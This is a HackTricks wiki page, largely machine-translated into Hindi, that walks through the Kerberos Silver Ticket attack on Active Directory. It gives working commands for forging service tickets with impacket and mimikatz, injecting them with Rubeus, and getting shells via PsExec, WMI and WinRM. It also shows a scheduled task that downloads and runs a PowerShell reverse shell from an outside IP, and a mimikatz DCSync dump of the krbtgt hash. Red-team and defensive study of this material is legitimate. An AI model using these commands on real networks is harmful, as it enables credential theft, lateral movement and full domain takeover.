# Silver Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

**Silver Ticket** हमला Active Directory (AD) वातावरण में सेवा टिकटों के शोषण से संबंधित है। यह विधि **सेवा खाते का NTLM हैश प्राप्त करने** पर निर्भर करती है, जैसे कि एक कंप्यूटर खाता, ताकि एक टिकट ग्रांटिंग सेवा (TGS) टिकट को जाली बनाया जा सके। इस जाली टिकट के साथ, एक हमलावर नेटवर्क पर विशिष्ट सेवाओं तक पहुँच सकता है, **किसी भी उपयोगकर्ता का अनुकरण करते हुए**, आमतौर पर प्रशासनिक विशेषाधिकारों के लिए लक्ष्य बनाते हुए। यह जोर दिया गया है कि टिकटों को जाली बनाने के लिए AES कुंजियों का उपयोग करना अधिक सुरक्षित और कम पता लगाने योग्य है।

टिकट बनाने के लिए, विभिन्न उपकरणों का उपयोग किया जाता है जो ऑपरेटिंग सिस्टम के आधार पर होते हैं:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows पर
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
The CIFS सेवा को पीड़ित की फ़ाइल प्रणाली तक पहुँचने के लिए एक सामान्य लक्ष्य के रूप में उजागर किया गया है, लेकिन HOST और RPCSS जैसी अन्य सेवाओं का भी कार्यों और WMI प्रश्नों के लिए शोषण किया जा सकता है।

## उपलब्ध सेवाएँ

| सेवा प्रकार                                   | सेवा सिल्वर टिकट्स                                                       |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell रिमोटिंग                        | <p>HOST</p><p>HTTP</p><p>OS के आधार पर भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ अवसरों पर आप बस पूछ सकते हैं: WINRM</p> |
| अनुसूचित कार्य                            | HOST                                                                       |
| Windows फ़ाइल साझा, साथ ही psexec         | CIFS                                                                       |
| LDAP संचालन, जिसमें DCSync शामिल है       | LDAP                                                                       |
| Windows रिमोट सर्वर प्रशासन उपकरण         | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| गोल्डन टिकट्स                             | krbtgt                                                                     |

**Rubeus** का उपयोग करके आप **इन सभी** टिकटों के लिए अनुरोध कर सकते हैं:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### सिल्वर टिकट्स इवेंट आईडी

* 4624: खाता लॉगिन
* 4634: खाता लॉगआउट
* 4672: व्यवस्थापक लॉगिन

## सेवा टिकटों का दुरुपयोग

निम्नलिखित उदाहरणों में कल्पना करें कि टिकट को व्यवस्थापक खाते का अनुकरण करते हुए पुनः प्राप्त किया गया है।

### CIFS

इस टिकट के साथ आप `C$` और `ADMIN$` फ़ोल्डर तक पहुँचने में सक्षम होंगे **SMB** के माध्यम से (यदि वे उजागर हैं) और फ़ाइलों को दूरस्थ फ़ाइल प्रणाली के एक भाग में कॉपी कर सकते हैं, बस कुछ ऐसा करके:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप होस्ट के अंदर एक शेल प्राप्त करने या **psexec** का उपयोग करके मनमाने आदेश निष्पादित करने में भी सक्षम होंगे:

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

इस अनुमति के साथ आप दूरस्थ कंप्यूटरों में अनुसूचित कार्य उत्पन्न कर सकते हैं और मनमाने आदेश निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकटों के साथ आप **शिकार प्रणाली में WMI निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
**wmiexec** के बारे में **अधिक जानकारी** निम्नलिखित पृष्ठ पर खोजें:

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

winrm एक्सेस के साथ आप एक कंप्यूटर को **एक्सेस** कर सकते हैं और यहां तक कि एक PowerShell प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check the following page to learn **एक दूरस्थ होस्ट से winrm का उपयोग करके कनेक्ट करने के अधिक तरीके**:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
ध्यान दें कि **winrm को सक्रिय और सुनने वाला होना चाहिए** दूरस्थ कंप्यूटर पर इसे एक्सेस करने के लिए।
{% endhint %}

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ पर:

## संदर्भ

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**बग बाउंटी टिप**: **साइन अप करें** **Intigriti** के लिए, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा, हैकर्स के लिए बनाया गया है**! आज ही [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) पर हमारे साथ जुड़ें, और **$100,000** तक की बाउंटी कमाना शुरू करें!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर हमें **फॉलो करें** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
